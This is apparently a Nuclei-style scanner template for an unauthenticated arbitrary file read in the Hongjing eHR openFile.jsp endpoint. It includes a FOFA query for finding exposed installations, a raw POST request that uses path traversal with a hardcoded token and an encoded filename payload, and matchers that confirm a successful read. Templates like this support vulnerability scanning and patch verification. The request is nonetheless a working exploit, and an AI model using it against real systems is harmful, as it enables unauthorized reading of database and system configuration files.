id: Hongjing-openFile-File-reading

info:
  name: 宏景-eHR openFile.jsp 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    fofa: body="<div class=\"hj-hy-all-one-logo\"" || title="人力资源信息管理系统" || body="/general/sys/hjaxmanage.js"
    宏景eHR openFile.jsp 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件(如数据库配置文件、系统配置文件)等等，导致网站处于极度不安全状态。
  reference:
    - 
  tags: File reading

http:
  - raw:
      - |
        POST /templates/attestation/../../general/muster/hmuster/openFile.jsp HTTP/1.1 
        Host: {{Hostname}}
        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
        Content-Type: application/x-www-form-urlencoded

        filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<?xml version="1.0" encoding="UTF-8"?>'
      - type: status
        status: 
          - 200





